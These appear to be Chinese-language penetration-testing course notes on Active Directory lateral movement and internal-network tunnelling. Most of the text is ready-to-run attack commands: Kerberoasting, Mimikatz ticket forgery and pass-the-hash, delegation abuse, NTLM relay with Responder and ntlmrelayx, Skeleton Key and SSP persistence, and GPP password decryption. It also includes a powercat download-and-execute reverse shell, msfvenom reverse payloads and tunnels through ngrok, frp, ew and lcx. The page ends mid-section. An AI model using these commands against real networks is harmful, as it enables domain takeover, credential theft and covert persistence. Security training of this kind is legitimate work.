---
title: XD安全渗透测试课程 Day69-70 学习笔记：域横向移动与内网漫游代理隧道技术
description: 整理 XD安全渗透测试课程 Day69-70 内容：Day69 覆盖域横向移动实战（RDP 凭证复用、SPN 扫描与 Kerberoasting
  完整利用流程、Cobalt Strike 团队服务器部署、监听器配置、Beacon 生命周期管理、提权插件扩展、域内信息收集与横向攻击演示、PTH/PTT/委派攻击、NTLM
  Relay 多变体攻击）；Day70 讲解内网漫游 SOCKS 代理隧道技术（正反向连接区别、代理与隧道定位、Ngrok 免费公网隧道实战、Frp 自建跳板搭建、Metasploit
  路由添加与 SOCKS4a 代理开启、多层代理工具链配置、三层内网渗透演练全链路复现、多种传输通道技术）。
category: program-analysis
tags:
- XD安全
- 渗透测试
- 内网渗透
- 域横向移动
- Cobalt Strike
- Kerberoasting
- SPN扫描
- RDP
- SOCKS代理
- 内网穿透
- Ngrok
- Frp
- Metasploit
- 隧道技术
- NTLM Relay
- LLMNR
- WPAD
- mitm6
- Responder
- ntlmrelayx
- 学习笔记
date: '2023-04-16'
updated: '2026-11-15'
---

## 概述

本页面整理自 XD安全渗透测试课程第 69-70 天学习笔记（微信公众号文章《XD安全渗透测试课 学习笔记 | 内网渗透(三)》）并融合 Jumbo 实战备忘录《渗透中的内网渗透》核心技术细节。内容分为两大模块：

- **Day69：域横向移动实战** —— 涵盖 RDP 凭证复用、SPN 服务枚举与 **Kerberoasting 完整利用流程**、Cobalt Strike 团队服务器部署与 Beacon 生命周期管理、提权插件扩展、域内信息收集与横向攻击演示、**PTH/PTT 凭证复用、委派攻击、NTLM Relay 多变体攻击（LLMNR/WPAD/mitm6/SMB Relay）及 Responder 与 ntlmrelayx 联动实战参数**。
- **Day70：内网漫游 SOCKS 代理隧道技术** —— 系统讲解正向/反向连接区别、代理与隧道定位、Ngrok 免费公网隧道实战、Frp 自建跳板搭建、Metasploit 路由添加与 SOCKS4a 代理开启、多层代理工具链配置、**多种传输通道技术（netsh/SSH/reGeorg/ew/lcx/powercat/mssql）**、三层内网渗透演练全链路复现。

> 交叉引用：[[xd-security-pentest-course-curriculum]] 提供完整课程大纲与资料下载；[[xd-security-internal-network-penetration-notes-day67-68]] 记录 Day67-68 域横向移动基础（SMB/WMI/PTH/PTK/PTT/委派/SPN扫描/黄金白银票据/SpoolSample/Ladon）；[[xd-security-internal-network-penetration-notes-day71-72]] 继续记录 Day71-72 隧道技术与应急响应内容；[[jumbo-internal-penetration-cheatsheet]] 为 Jumbo 实战内网渗透备忘录速查表。

---

## Day69：域横向移动

### RDP 协议凭证复用

在获得明文密码或 NTLM Hash 后，可直接通过 RDP（3389 端口）建立图形化会话。

| 平台 | 命令示例 |
|------|----------|
| Windows | `mstsc.exe /console /v:192.168.3.21 /admin` |
| Linux | `rdesktop 192.168.3.21:3389` |

> 关联页面：[[lm-ntlm-hash-generation-analysis]] 解析 NTLM Hash 生成算法；[[xd-security-pentest-basic-stage-notes]] 基础阶段包含凭证获取与横向移动基础。

### SPN 扫描与 Kerberoasting 完整利用流程

**核心原理**：Kerberos 协议中，客户端请求服务票据 (TGS) 时，KDC 使用服务账户的密码哈希（RC4_HMAC_MD5）加密票据。普通域用户可请求任意 SPN 的 TGS，离线爆破即可还原服务账户明文密码。

**完整攻击链**：

1. **SPN 探针枚举**  
   ```bash
   # 系统自带
   setspn -T <domain> -Q */*          # 枚举全域 SPN
   setspn -Q */* | findstr "MSSQL"    # 定位特定服务（如 MSSQL）
   
   # PowerView / PowerShell
   Get-DomainUser -SPN -Domain <domain> | Select samaccountname,serviceprincipalname
   ```

2. **请求服务票据 (TGS-REQ)**  
   ```powershell
   # PowerShell 原生请求
   $SPNName = 'MSSQLSvc/sql01.domain.local:1433'
   Add-Type -AssemblyName System.IdentityModel
   New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName
   
   # Mimikatz 请求并导出
   mimikatz.exe "kerberos::ask /target:MSSQLSvc/sql01.domain.local:1433" "kerberos::list /export"
   # 生成 .kirbi 文件（如 2-40a10000-user@service~domain.COM.kirbi）
   ```

3. **离线爆破**  
   ```bash
   # tgsrepcrack.py (需字典)
   python tgsrepcrack.py wordlist.txt ticket.kirbi
   
   # Hashcat 模式 13100 (Kerberos 5 TGS-REP etype 23)
   hashcat -m 13100 ticket.kirbi rockyou.txt --force
   
   # kerberoast.py / Impacket 脚本
   python kerberoast.py -d domain.local -u user -p pass --request --outputfile hashes.txt
   ```

4. **凭证重写与横向移动**  
   破解得到明文密码后，可通过 `runas /netonly`、PsExec、WMI、SMB、RDP、Cobalt Strike `make_token`/`pth` 等方式复用凭证横向移动。

> 关联页面：[[cobalt-strike-external-c2-smb-beacon]] 含 Kerberoasting 与 SMB Beacon 横向移动实战；[[mimikatz-source-code-architecture-golden-ticket-audit]] 深度解析 Mimikatz Kerberos 模块源码；[[named-pipe-smb-detection-sysmon]] 覆盖 SMB 命名管道检测视角。

### Cobalt Strike 团队服务器部署与基础操作

#### 启动与连接

```bash
# 团队服务器 (Linux)
./teamserver <IP> <Password> [profile] [port]

# 客户端连接
./cobaltstrike
```
客户端需填写团队服务器 IP、端口、用户名、密码。

#### 监听器配置

- 支持 HTTP/HTTPS/DNS/SMB/External C2 等多种 Beacon 通信协议
- 关键字段：Name、Host (Team Server IP)、Port、Beacon Interval/Jitter、Spawnto、Proxy 配置
- 可创建多个监听器区分不同目标环境
- **Malleable C2 Profile** 定制流量特征，参考 [[c2-redirectors-malleable-c2-profiles]]

#### Beacon 生成与上线

- **Attack → Packages → Windows Executable (S)/PowerShell/Service/...**
- 绑定监听器，设置输出路径，生成 Payload
- 目标执行后，Cobalt Strike 客户端 `Beacons` 视图显示上线会话

#### 提权与插件扩展

- 内置提权：`elevate uac-token-duplication`、`elevate system` 等
- **插件加载**：`View → Script Console → Load` 加载 `.cna` 脚本（如 ElevateKit、BOF、AceLdr 等），扩展提权/横向/持久化能力
- 关联 [[inceptor-av-edr-evasion-framework]]、[[cobalt-strike-4.7-bof-internals]] 了解 BOF 免杀与内存规避

#### 域内信息收集命令速查

| 目标 | 命令 |
|------|------|
| 当前用户/权限 | `whoami /all`、`getuid` |
| 网络拓扑/域控定位 | `net view /domain`、`net group "Domain Controllers" /domain`、`net time /domain`、`nslookup -type=all _ldap._tcp.dc._msdcs.domain.com` |
| 域用户/组枚举 | `net user /domain`、`net group /domain`、`net group "Domain Admins" /domain` |
| SPN 枚举 | `setspn -q */*` |
| 会话/共享枚举 | `net session`、`net share`、`net view \\host` |
| 进程列表 | `ps`、`ps -U` |
| 凭证导出 | `mimikatz` → `sekurlsa::logonpasswords`、`lsadump::dcsync` |
| 票据操作 | `kerberos::list`、`kerberos::ptt`、`kerberos::ask` |
| 信任关系 | `nltest /domain_trusts` |
| BloodHound | `SharpHound.exe -c all` → 导入 BloodHound 分析最短攻击路径 |

> 关联页面：[[internal-network-pivoting-techniques]] 系统对比 Venom/Frp/SSH/Cobalt Strike SMB Beacon 等代理隧道技术。

#### 横向移动演示

- **Targets 视图**：自动构建域拓扑图，右键目标主机 → `Pivoting` / `Jump` / `Remote-exec`
- 支持 `psexec`、`winrm`、`wmi`、`rdp`、`smb` 等多种横向模块
- 结合 `make_token` / `pth` / `pass-the-ticket` 实现凭证复用

---

### PTH (Pass the Hash) 实战

当只有 NTLM Hash 无明文密码时，利用哈希传递进行认证。

#### Impacket 套件

```bash
# WMIExec
python wmiexec.py -hashes :<NTLM_HASH> domain/administrator@192.168.3.108 "whoami"

# PsExec
python psexec.py -hashes :<NTLM_HASH> domain/administrator@192.168.3.51

# SMBExec
python smbexec.py -hashes :<NTLM_HASH> domain/administrator@192.168.3.11
```

#### Invoke-TheHash (PowerShell)

```powershell
# WMI
Invoke-WMIExec -Target 192.168.1.1 -Domain test.local -Username test1 -Hash <NTLM_HASH> -Command "calc.exe"

# SMB
Invoke-SMBExec -Target 192.168.0.2 -Domain test.local -Username test1 -Hash <NTLM_HASH> -Command "calc.exe"
```

#### Mimikatz sekurlsa::pth

```bash
mimikatz.exe privilege::debug "sekurlsa::pth /user:test1 /domain:test.local /ntlm:<NTLM_HASH>" exit
# 弹出的新 cmd 进程上下文为目标用户，可访问网络资源
```

#### AES256 密钥传递 (KB2871997 环境)

```bash
# 获取 AES256 密钥
mimikatz.exe privilege::debug "sekurlsa::ekeys" exit

# 使用 AES256 传递
mimikatz.exe privilege::debug "sekurlsa::pth /user:test1 /domain:test.local /aes256:<AES256_KEY>" exit
```

---

### PTT (Pass the Ticket) 实战

#### 金票据 - 伪造 TGT

需获取 `krbtgt` 账户 Hash。

```bash
mimikatz.exe privilege::debug "kerberos::golden /admin:administrator /domain:domain.com /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ticket:admin.kirbi" exit
mimikatz.exe privilege::debug "kerberos::ptt admin.kirbi" exit
kerberos::tgt
dir \\dc.domain.com\c$
```

#### 银票据 - 伪造 TGS

需目标服务账户 Hash（如机器账户 $）。

```bash
mimikatz.exe privilege::debug "kerberos::golden /domain:domain.com /sid:<DOMAIN_SID> /target:dc.domain.com /service:cifs /rc4:<MACHINE_NTLM_HASH> /user:administrator /ptt" exit
dir \\dc.domain.com\c$
```

#### Kekeo 工具链

```bash
# 申请 TGT (使用 NTLM Hash)
kekeo.exe "tgt::ask /user:test1 /domain:test.local /ntlm:<NTLM_HASH>"
# 生成 TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi

# 导入票据
kekeo.exe "kerberos::ptt TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi"

# S4U2Self + S4U2Proxy 申请 ST (约束委派利用)
kekeo.exe "tgs::s4u /tgt:TGT_xxx.kirbi /user:Administrator@domain.com /service:cifs/dc.domain.com"
```

---

### 委派攻击

#### 资源型约束委派

**前提**：控制一台机器账户（或拥有写 `msDS-AllowedToActOnBehalfOfOtherIdentity` 权限的用户），配置目标机器信任该账户。

```powershell
# 1. 添加机器账户 (普通用户默认配额 10 台)
addcomputer.py -computer-name 'EVIL$' -computer-pass 'Pass123' -dc-ip <DC_IP> domain.com/user:pass

# 2. 配置资源型约束委派 (需目标机器写权限)
# 使用 PowerView / ADModule
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-...-EVIL$)",0
Set-DomainObject -Identity "TargetComputer$" -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SD.GetSddlForm()}

# 3. 利用 S4U 协议申请 Administrator 票据访问目标
getST.py -dc-ip <DC_IP> domain.com/EVIL$:Pass123 -spn cifs/target.domain.com -impersonate administrator
export KRB5CCNAME=administrator.ccache
smbexec.py -no-pass -k -debug target.domain.com
```

#### 非约束委派

**前提**：目标主机/服务账户配置 `TrustedForDelegation`。诱导高权限账户 (如域管) 连接该主机，导出其 TGT。

```bash
# 1. 发现非约束委派主机
Get-NetComputer -Unconstrained -Domain domain.com
Get-DomainUser -Unconstrained -Domain domain.com

# 2. 利用 SpoolSample 强制域控认证到该主机
SpoolSample.exe dc.domain.com evil.domain.com

# 3. 导出票据
mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit

# 4. 导入 TGT
mimikatz.exe privilege::debug "kerberos::ptt [0;xxxx]-2-0-xxxx-DC$@krbtgt-DOMAIN.COM.kirbi" exit

# 5. DCSync 获取域控哈希
mimikatz.exe privilege::debug "lsadump::dcsync /domain:domain.com /all /csv" exit
```

#### 约束委派

**前提**：服务账户配置 `msDS-AllowedToDelegateTo` 列表。利用 S4U2Proxy 协议。

```bash
# 1. 发现约束委派账户/主机
Get-DomainUser -TrustedToAuth -Domain domain.com
Get-DomainComputer -TrustedToAuth -Domain domain.com

# 2. 为服务账户添加 SPN (如需)
setspn.exe -U -A test/test serviceaccount

# 3. 申请服务账户 TGT
kekeo.exe "tgt::ask /user:serviceaccount /domain:domain.com /password:Pass123"

# 4. 利用 S4U 申请目标服务 ST (模拟 Administrator)
kekeo.exe "tgs::s4u /tgt:TGT_serviceaccount@DOMAIN.COM_krbtgt~DOMAIN.COM@DOMAIN.COM.kirbi /user:Administrator@domain.com /service:cifs/dc.domain.com"

# 5. 导入 ST
mimikatz.exe privilege::debug "kerberos::ptt TGS_Administrator@DOMAIN.COM_cifs~dc.domain.com@DOMAIN.COM.kirbi" exit
```

---

### NTLM Relay 多变体攻击 (LLMNR / WPAD / mitm6 / SMB Relay)

核心工具：**Responder** (毒化/监听) + **ntlmrelayx.py** (中继转发)。

#### 环境准备

```bash
# Kali 攻击机
# 关闭 Responder 自带 SMB/HTTP 服务，释放端口给 ntlmrelayx
# 编辑 /etc/responder/Responder.conf:
# SMB = Off
# HTTP = Off
```

#### LLMNR/NBT-NS 投毒 + SMB Relay

```bash
# 终端 1: Responder 监听 LLMNR/NBT-NS
responder -I eth0 -rdwv   # -r LLMNR, -d NBT-NS, -w WPAD, -v verbose

# 终端 2: ntlmrelayx 中继到目标 (如域控 LDAP/SMB)
ntlmrelayx.py -t ldap://dc.domain.com -smb2support --dump-laps --dump-gmsa
# 或中继到 SMB 获取 Shell
ntlmrelayx.py -t smb://192.168.1.10 -smb2support -i  # 交互式 Shell
```

#### WPAD 攻击 (HTTP Basic Auth 窃取明文/Net-NTLM)

```bash
# Responder 开启 WPAD 服务 (-w) 并强制 Basic Auth (-F -b)
responder -I eth0 -wFb -v

# 受害者访问不存在域名 (如 http://notexist) 时，浏览器自动查找 wpad.dat
# Responder 返回 401 认证，用户输入凭证即被捕获 (明文或 Net-NTLMv2)
```

#### mitm6 (IPv6 DNS 接管) + NTLM Relay

**原理**：Windows 默认开启 IPv6 且优先级高于 IPv4。mitm6 监听 DHCPv6 请求，宣称自己为 IPv6 DNS 服务器，受害者解析内网主机名时流量经攻击机，配合 Responder/ntlmrelayx 进行中继。

```bash
# 终端 1: mitm6 监听 DHCPv6
mitm6 -d domain.com -v

# 终端 2: Responder (仅 HTTP/SMB 服务，不投毒 LLMNR)
responder -I eth0 -Pv -v  # -P 不投毒, -v 仅开启服务

# 终端 3: ntlmrelayx 中继到 LDAPS (需 -ldaps) 或 SMB
ntlmrelayx.py -t ldaps://dc.domain.com -wh 192.168.1.100 -l lootme -smb2support
# -wh: WPAD 主机 IP (攻击机), -l: 日志目录
```

> **实战参数速查**：
> - `ntlmrelayx.py -t <target> -smb2support -i` (交互式 SMB Shell)
> - `ntlmrelayx.py -t ldap://dc -smb2support --add-computer` (添加机器账户 -> 资源型约束委派链)
> - `ntlmrelayx.py -t smb://target -c "whoami"` (执行单条命令)
> - `responder -I eth0 -rdwv -F` (指纹识别模式)

#### SMB 签名绕过条件

- 目标未强制 SMB 签名 (`EnableSecuritySignature = 0`, `RequireSecuritySignature = 0`)
- 域环境默认域控要求签名，但普通工作站/服务器通常不强制
- 中继跨协议 (HTTP->SMB, LDAP->SMB) 需目标支持相应协议

---

### 常用远程连接与命令执行方式 (凭证复用)

| 方式 | 命令示例 | 适用场景 |
|------|----------|----------|
| **IPC$** | `net use \\1.1.1.1\ipc$ "pass" /user:domain\user` | 建立会话基础 |
| **PsExec** | `psexec \\target -u user -p pass cmd.exe` / `psexec.py domain/user@target` | 服务启动方式，需 ADMIN$ 共享 |
| **WMI** | `wmic /user:user /password:pass /node:target process call create "cmd"`<br>`Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd" -ComputerName target -Credential $cred` | 无需开放 445，需 135/WMI 端口 |
| **Scheduled Tasks** | `schtasks /create /s target /u user /p pass /ru SYSTEM /tn "task" /sc DAILY /tr "cmd" /F`<br>`schtasks /run /s target /u user /p pass /tn "task"` | 落地持久化或一次性执行 |
| **AT** | `at \\target 15:15 cmd` | 旧版系统 (Win2003/XP) |
| **SC** | `sc \\target create service binpath= "cmd"`<br>`sc \\target start service` | 创建服务执行 |
| **Registry** | `reg add \\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v name /t REG_SZ /d "cmd"` | 启动项持久化 |
| **DCOM** | `powershell $com=[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"));$com.Document.ActiveView.ExecuteShellCommand('cmd',$null,"/c calc","Minimized")` | 利用 DCOM 组件 (MMC20, ShellWindows, ShellBrowserWindow) |
| **WinRM** | `winrs -r:http://target:5985 -u:user -p:pass "whoami"`<br>`Enter-PSSession -ComputerName target -Credential $cred` | 需 5985/5986 开启，域管默认允许 |

---

### DSRM (Directory Services Restore Mode) 利用

**前提**：域控权限，同步 DSRM 密码为已知账户密码。

```bash
# 1. 同步 DSRM 密码
ntdsutil
set DSRM password
SYNC FROM DOMAIN ACCOUNT username
q
q

# 2. 修改注册表允许 DSRM 账户网络登录
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f

# 3. PTH 连接 (域控计算机名作为域)
mimikatz.exe privilege::debug "sekurlsa::pth /domain:DC_COMPUTERNAME /user:Administrator /ntlm:<SYNCED_NTLM>" exit
```

---

### GPP (Group Policy Preferences) 密码解密

**位置**：`\\domain.com\SYSVOL\domain.com\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml` (或 Services/ScheduledTasks 等)

**特征**：`cpassword="加密字符串"` (AES-256，密钥微软公开)

**解密**：
```powershell
# PowerSploit
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword

# 手动 Python
# pip install pycryptodome
python -c "from Crypto.Cipher import AES; import base64; key=b'4e9906e8fcb66cc9faf49310620ffe67'; ct=base64.b64decode('cpassword_value'); aes=AES.new(key, AES.MODE_CBC, b'\x00'*16); print(aes.decrypt(ct).rstrip(b'\x00').decode())"
```

---

### SSP (Security Support Provider) 持久化

```bash
# 1. 复制 mimilib.dll 到 C:\Windows\System32
# 2. 注册表添加
reg add "HKLM\System\CurrentControlSet\Control\Lsa\Security Packages" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f
# 3. 重启后，mimilib 记录登录明文密码到 C:\Windows\System32\kiwissp.log
```

**无需重启 (RPC 加载 SSP)**：
```bash
# 利用 mimikatz 远程加载 SSP
mimikatz.exe privilege::debug "misc::memssp" exit
# 记录到 %TEMP%\mimilsa.log
```

---

### Skeleton Key (万能密码)

```bash
mimikatz.exe privilege::debug "misc::skeleton" exit
# 所有域用户密码均可使用 "mimikatz" 登录 (原密码仍有效)
# 重启失效，需结合自启动持久化
```

---

### Hook PasswordChangeNotify 截获修改密码

将 DLL 注入 `lsass.exe`，Hook `PasswordChangeNotify` 导出函数，拦截密码修改事件。

```bash
# 项目: https://github.com/Jumbo-WJB/Misc-Windows-Hacking
# 编译 DLL，使用 mimikatz/Injector 注入 lsass.exe
# 日志输出至指定文件
```

---

### LAPS (Local Administrator Password Solution) 读取

**前提**：拥有读取 `ms-Mcs-AdmPwd` 属性权限 (默认仅域管/指定 OU 管理员)。

```powershell
Import-Module AdmPwd.PS
Get-AdmPwdPassword -ComputerName target01

# 或原生 AD
Get-ADComputer target01 -Properties ms-Mcs-AdmPwd | Select Name, ms-Mcs-AdmPwd
```

---

## Day70：内网漫游 SOCKS 代理隧道技术

### 核心概念辨析

| 概念 | 说明 |
|------|------|
| **正向连接** | 控制端主动连接被控端（需被控端有公网 IP 或端口映射） |
| **反向连接** | 被控端主动连接控制端（适用于被控端在内网、控制端在公网） |
| **代理** | 解决**网络连通性**问题，转发应用层流量（SOCKS4/5、HTTP） |
| **隧道** | 解决**流量隐匿/防火墙绕过**问题，封装任意协议流量（ICMP/DNS/HTTP/TCP/UDP） |

> 关联页面：[[xd-security-incident-response-notes]] Day71 详细记录 ICMP/端口转发/Netcat/DNS 隧道实战；[[frp内网渗透应用]] 系统记录 Frp 四大典型应用场景（Socks5、多级隧道、MSF 代理、RDP 转发）。

---

### 传输通道 / 隧道技术工具箱 (补充)

#### netsh 端口转发 (Windows 原生)

```bash
# A 机器转发本地 5555 到目标 3389
netsh interface portproxy add v4tov4 listenport=5555 connectport=3389 connectaddress=192.168.1.1 protocol=tcp

# 查看/删除
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=5555
```

#### SSH 隧道 (OpenSSH)

```bash
# 动态 SOCKS 代理 (正向)
ssh -qTfnN -D 1080 user@jump_host

# 本地端口转发 (正向: 本地 -> 目标)
ssh -CNfg -L 2121:target_ip:21 user@jump_host

# 远程端口转发 (反向: 目标 -> 本地)
ssh -CNfg -R 2121:target_ip:21 user@public_vps
```

#### reGeorg (Web 隧道)

```bash
# 1. 上传 tunnel.aspx/.php/.jsp 到目标 Web 目录
# 2. 本地启动 SOCKS 代理
python reGeorgSocksProxy.py -p 1080 -u http://target/tunnel.aspx
# 配合 proxychains 使用
```

#### ew (EarthWorm) 多级级联

```bash
# 场景: 公网 VPS <-> A (有公网) <-> B (内网) <-> C (深层内网)

# VPS (根节点)
./ew -s rcsocks -l 1080 -e 8888

# A (桥接节点)
./ew -s lcx_slave -d vps_ip -e 8888 -f b_ip -g 9999

# B (内网节点, 开启 SOCKS)
./ew -s ssocksd -l 9999

# 最终访问 VPS:1080 即代理到 B 网络
```

#### lcx (端口转发/反弹)

```bash
# VPS 监听
lcx.exe -listen 1111 2222

# 受害者反弹 3389 到 VPS:1111
lcx.exe -slave vps_ip 1111 127.0.0.1 3389

# 访问 VPS:2222 即连受害者 3389
```

#### powercat (PowerShell 版 nc)

```powershell
# 监听反弹 Shell
powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -l -p 8000 -e cmd"

# 反向连接
powercat -c attacker_ip -p 443 -e cmd
```

#### mssqlproxy (CLR 组件代理)

```bash
# 项目: https://github.com/blackarrowsec/mssqlproxy
# 利用 MSSQL CLR 组件加载代理 DLL，建立 SOCKS 通道
python mssqlproxy.py -u sa -p pass -d domain -target 192.168.1.100
```

---

### Ngrok 免费公网隧道实战

**适用场景**：攻击机与目标机均处于不同内网，无公网 IP，需借助公共 Ngrok 服务建立反向通道。

**操作流程**：

1. 注册 [ngrok.cc](http://www.ngrok.cc/) 获取 `clientid`，创建隧道：协议 HTTP/TCP、本地端口指向 MSF/Cobalt Strike 监听端口（如 `192.168.76.132:4444`）
2. 攻击机 (Kali) 下载 `sunny` 客户端并启动：
   ```bash
   ./sunny clientid <你的clientid>
   ```
3. MSF 生成反向 Payload 指向 Ngrok 分配的公网域名/端口：
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=xioadiisec.free.idcfengye.com LPORT=80 -f exe > shell.exe
   ```
4. 目标机执行 `shell.exe`，流量经 Ngrok 隧道回传至攻击机 MSF 监听器上线

**优缺点**：零成本、无需自建服务器；但免费版带宽/并发受限、流量经第三方平台、不适合敏感实战。

---

### Frp 自建跳板服务搭建

**适用场景**：拥有公网 VPS，需完全可控、支持多协议（TCP/UDP/HTTP/HTTPS/STCP/XTCP）的内网穿透方案。

#### 服务端配置

```ini
# frps.ini
[common]
bind_port = 6677           # frpc 连接端口
vhost_http_port = 80       # HTTP 隧道端口
vhost_https_port = 443
dashboard_port = 7500      # Web 管理面板
dashboard_user = admin
dashboard_pwd = password
token = frp_token          # 认证令牌
```

启动：`./frps -c frps.ini`（建议配置 systemd 守护进程）

#### 客户端配置

```ini
# frpc.ini
[common]
server_addr = <VPS_IP>
server_port = 6677
token = frp_token

[msf_reverse_tcp]
type = tcp
local_ip = 127.0.0.1
local_port = 5555          # 本地 MSF 监听端口
remote_port = 6000         # VPS 暴露端口，目标连接此端口

[rdp_forward]
type = tcp
local_ip = 127.0.0.1
local_port = 3389
remote_port = 33890
```

启动：`./frpc -c frpc.ini`

#### 实战链路

1. 攻击机 MSF 监听 `127.0.0.1:5555`
2. 目标机执行指向 `VPS_IP:6000` 的反向 Payload
3. 流量经 Frp 隧道转发至攻击机 MSF 上线
4. 后续可复用隧道转发 RDP、SMB、WinRM 等服务端口

> 关联页面：[[gkctf-2021-web-writeup]] 中 `hackme` 题目实战使用 Frp 穿透内网；[[vulnhub-boredhackerblog-social-network-writeup]] 记录 Docker 逃逸后利用 Frp 建立多级代理横向移动。

---

### Metasploit 路由添加与 SOCKS4a 代理

**场景**：已控制边界主机（双网卡），需通过该主机作为跳板访问深层内网。

#### 关键命令序列

```bash
# 1. 查看目标会话网卡信息
meterpreter > ifconfig
# 发现除已知网段外，还有 10.0.22.0/24 内网段

# 2. 添加路由
meterpreter > run autoroute -s 10.0.22.0/24
# 或手动
meterpreter > route add 10.0.22.0 255.255.255.0 <session_id>

# 3. 验证路由
meterpreter > route print

# 4. 在 MSF 控制台开启 SOCKS4a 代理
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 4a
msf6 auxiliary(server/socks_proxy) > run -j

# 5. 配置 proxychains / Proxifier / SocksCap64 / 蚁剑 使用 127.0.0.1:1080
```

> 关联页面：[[metasploit-framework-basics-tutorial]] 覆盖 MSF 基础部署与后渗透模块；[[internal-network-pivoting-techniques]] 详细对比 MSF 路由、Cobalt Strike SOCKS、SSH 隧道等方案。

---

### 多层代理工具链配置

| 工具 | 代理协议 | 典型用法 |
|------|----------|----------|
| **Proxychains** | SOCKS4/5/HTTP | `proxychains nmap -sT -Pn 10.0.22.128` |
| **Proxifier** | 全局/规则制 | 将任意 GUI 工具（浏览器、蚁剑、Navicat、mstsc）强制走代理 |
| **SocksCap64** | 进程级注入 | 右键目标程序 → `Run with SocksCap64` |
| **蚁剑** | 内置代理设置 | `设置 → 代理 → SOCKS5 127.0.0.1:1080` |

**注意**：MSF `socks_proxy` 默认开启 **SOCKS4a**（支持域名解析），Proxychains 需配置 `socks4 127.0.0.1 1080`。

---

### Cobalt Strike SOCKS 代理与 VPN 接口

```bash
# Beacon 控制台开启 SOCKS4a
socks 1080

# 或使用 VPN 接口 (需管理员权限)
# 1. Beacon 执行: elevatesudo
# 2. 客户端: View -> Proxy Pivots -> New -> VPN Interface
# 3. 系统新增虚拟网卡，全流量自动路由至目标内网
```

---

## 三层内网渗透演练全流程复现（某 CTF 线下 2019）

### 拓扑结构

```
攻击机 (Kali, 公网/出口) 
    │
    ▼ (Frp/Ngrok/MSF SOCKS)
边界主机 A (192.168.75.148, 双网卡: .75/.22) ── 内网 B (192.168.22.128, Web) ── 内网 C (192.168.22.x, 目标主机)
```

### 实战步骤速览

| 阶段 | 关键动作 | 工具/技术 |
|------|----------|-----------|
| **1. 边界突破** | 端口扫描 → ThinkPHP RCE → 写 Webshell (2.php) → 蚁剑连接 | Nmap、ThinkPHP Exploit、蚁剑 |
| **2. 立足点转 MSF** | 生成 Linux `meterpreter_reverse_tcp` → 上传执行 → MSF 上线 | msfvenom、MSF `multi/handler` |
| **3. 内网探测 & 路由** | `ifconfig` 发现 .22 网段 → `autoroute -s 192.168.22.0/24` | Meterpreter `autoroute` |
| **4. 开启 SOCKS 代理** | MSF `auxiliary/server/socks_proxy` (SRVPORT=1080, VERSION=4a) | MSF SOCKS4a |
| **5. 代理访问内网 Web** | 浏览器/Proxychains 配置代理 → 访问 `http://192.168.22.128` → 代码审计发现 SQLi → 拿后台账号 | Proxychains、SQLMap/手工注入 |
| **6. 后台 Getshell** | 后台功能点写 Webshell → 蚁剑配置代理连接 | 蚁剑 SOCKS5 代理 |
| **7. 横向深入** | 生成 Windows 正向绑定 Payload (`bind_tcp` LPORT=3333) → 上传执行 → MSF 监听上线 | msfvenom、MSF `multi/handler` |
| **8. 继续扩大战果** | 新会话 `autoroute` 添加下一层网段 → 循环步骤 4-7 | MSF 路由、SOCKS 代理 |

### 关键技术点总结

- **双网卡主机作为天然跳板**：无需额外部署隧道软件，直接用 Meterpreter `autoroute` + MSF SOCKS 代理即可穿透
- **正向/反向 Payload 选择**：边界主机出网用反向；内网主机无法直连攻击机时，用正向绑定配合端口转发/代理
- **工具代理化**：所有后续工具（Nmap、SQLMap、蚁剑、浏览器、RDP、SSH）均需走代理，Proxifier/Proxychains/SocksCap64 解决不支持代理的工具
- **会话管理**：多层内网建议使用 Cobalt Strike 或 MSF 多会话管理，配合 `route`/`socks_proxy` 实现统一代理出口

> 关联页面：[[vulnhub-boredhackerblog-social-network-writeup]] 同款三层内网渗透实战（Docker 逃逸 → Frp 代理 → Elasticsearch RCE → SSH → 内核提权）；[[cobalt-strike-external-c2-smb-beacon]] 覆盖 CS SMB Beacon 无需公网 IP 的横向移动模式。

---

## 速查表：Day69-70 核心命令与配置

### Kerberoasting

```bash
# 枚举 SPN
setspn -T domain.com -Q */*
Get-DomainUser -SPN -Domain domain.com

# 请求票据
# PowerShell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql01.domain.com:1433"
# Mimikatz
mimikatz "kerberos::ask /target:MSSQLSvc/sql01.domain.com:1433" "kerberos::list /export"

# 破解
python tgsrepcrack.py wordlist.txt ticket.kirbi
hashcat -m 13100 ticket.kirbi rockyou.txt --force
```

### Cobalt Strike 常用控制台命令

```bash
# 信息收集
net view /domain
net group "Domain Controllers" /domain
net user /domain
setspn -q */*

# 凭证
mimikatz sekurlsa::logonpasswords
lsadump::dcsync /domain:domain.com /user:krbtgt

# 横向
jump psexec64 TARGET listener
jump winrm64 TARGET listener
jump rdp TARGET listener
make_token DOMAIN\user password
pth DOMAIN\user ntlm_hash
```

### NTLM Relay (Responder + ntlmrelayx)

```bash
# Responder (关闭 SMB/HTTP 服务)
# /etc/responder/Responder.conf: SMB=Off, HTTP=Off
responder -I eth0 -rdwv -F

# ntlmrelayx (SMB Relay -> Shell)
